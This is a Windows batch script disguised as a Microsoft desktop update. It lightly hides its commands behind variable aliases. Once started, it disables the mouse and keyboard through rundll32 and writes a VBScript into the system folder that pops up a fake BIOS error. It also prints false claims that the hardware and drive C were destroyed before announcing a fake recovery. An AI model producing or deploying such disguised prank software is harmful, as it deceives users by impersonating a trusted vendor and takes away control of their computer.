cls
@echo off
@set e=echo
@set d=disable
@set f=destroyed !
@set t=type nul
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           Microsoft Windows Desktop Update SP 2.1
@%e%           Necesary files loaded, press any key when ready ...
@pause >nul
cls
@rundll32.exe mouse,%d%
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           Mouse %f%
@%t%|choice /n /cy /ty,2 >nul
cls
@rundll32.exe keyboard,%d%
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           Keyboard %f%
@%t%|choice /n /cy /ty,2 >nul
cls
@%e%.MsgBox " Bios error in 00000:00021f ",4160, "Error">%windir%\system\bjoke.vbs
@start %windir%\system\bjoke.vbs
@%t%|choice /n /cy /ty,2 >nul
cls
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           Bios %f%
@%t%|choice /n /cy /ty,2 >nul
cls
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           Hard drive "C" %f%
@%t%|choice /n /cy /ty,2 >nul
cls
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           Update succeds ! Congratulations on your new choice !
@%e%           Press any key to undo changes in your system ...
@pause >nul
cls
@%e%.
@%e%.
@%e%.
@%e%.
@%e%           System recovered, press any to exit ...
@pause >nul
cls